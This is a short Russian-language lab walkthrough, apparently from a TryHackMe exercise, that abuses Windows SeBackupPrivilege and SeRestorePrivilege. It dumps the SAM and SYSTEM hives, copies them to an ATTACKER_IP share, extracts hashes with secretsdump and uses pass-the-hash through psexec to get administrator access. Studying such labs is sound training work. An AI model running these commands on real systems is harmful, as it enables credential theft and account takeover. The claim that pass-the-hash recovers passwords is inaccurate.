# Уязвимость заключается в злоупотреблении SeBackupPrivilege и SeRestorePrivilege привелегиями.

C:\> whoami /priv


Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled   <---- Нужная привелегия
SeRestorePrivilege            Restore files and directories  Disabled   <---- Нужная привелегия
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

1. Экспортируем хэши паролей хранящиеся в SAM:

reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive

2. Создаем smb-сервер с помощью пакета impacket:
which smbserver.py

path/to/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share

3. Копируем файлы на атакующую машину:

copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

4. На атакующей машине используем secretdump.py из пакета impacket для выкачки хэшей паролей из сервера:
which secretsdump.py

path/to/secretsdump.py -sam sam.hive -system system.hive LOCAL

5. Ипользуем атаку PASS-the-HASH для получения паролей из хэшей:
which psexec.py

path/to/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.48.162.13